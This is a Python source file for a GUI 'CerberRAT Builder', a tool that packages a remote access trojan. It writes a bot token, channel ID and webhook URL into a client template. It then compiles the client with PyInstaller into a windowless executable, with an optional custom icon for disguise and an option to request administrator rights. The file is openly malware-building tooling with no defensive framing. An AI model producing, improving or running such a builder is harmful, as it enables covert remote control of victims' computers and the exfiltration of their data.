import os
import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess as sub

def build_rat():
    token = bot_token.get()
    channel = channel_id.get()
    webhook = webhook_url.get()
    name = exe_name.get()
    icon = icon_path.get()
    require_admin = uac_var.get()

    if not token or not channel or not webhook or not name:
        messagebox.showerror("Missing Info", "Please fill in all fields.")
        return

    src_path = "client/main.py"
    if not os.path.exists(src_path):
        messagebox.showerror("Error", f"File not found: {src_path}")
        return

    with open(src_path, "r", encoding="utf-8") as f:
        code = f.read()

    code = code.replace('BOT_TOKEN = ""', f'BOT_TOKEN = "{token}"')
    code = code.replace('CHANNEL_ID =', f'CHANNEL_ID = {channel}')
    code = code.replace('WEBHOOK_URL = ""', f'WEBHOOK_URL = "{webhook}"')

    os.makedirs("builder_output", exist_ok=True)
    temp_path = f"builder_output/{name}.py"
    with open(temp_path, "w", encoding="utf-8") as f:
        f.write(code)

    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--clean"
    ]

    if icon:
        cmd += ["--icon", icon]
    if require_admin:
        cmd += ["--uac-admin"]

    cmd += ["-n", name, temp_path]

    try:
        result = sub.run(cmd, check=True, capture_output=True, text=True)
        messagebox.showinfo("Build Complete", f"✅ Build finished!\nCheck 'dist/{name}.exe'")
    except sub.CalledProcessError as e:
        messagebox.showerror("Build Failed", f"❌ Build error:\n{e.stderr}")

def select_icon():
    path = filedialog.askopenfilename(filetypes=[("Icon files", "*.ico")])
    if path:
        icon_path.set(path)

root = tk.Tk()
root.title("CerberRAT Builder")
root.geometry("420x380")

tk.Label(root, text="Bot Token").pack()
bot_token = tk.Entry(root, width=60)
bot_token.pack()

tk.Label(root, text="Channel ID").pack()
channel_id = tk.Entry(root, width=60)
channel_id.pack()

tk.Label(root, text="Webhook URL").pack()
webhook_url = tk.Entry(root, width=60)
webhook_url.pack()

tk.Label(root, text="Output EXE Name").pack()
exe_name = tk.Entry(root, width=60)
exe_name.insert(0, "CerberClient")
exe_name.pack()

icon_path = tk.StringVar()
tk.Button(root, text="Select Icon", command=select_icon).pack()
tk.Label(root, textvariable=icon_path).pack()

uac_var = tk.BooleanVar()
tk.Checkbutton(root, text="Require UAC Admin", variable=uac_var).pack(pady=5)

tk.Button(root, text="Build", command=build_rat, bg="green", fg="white", width=20).pack(pady=15)

root.mainloop()
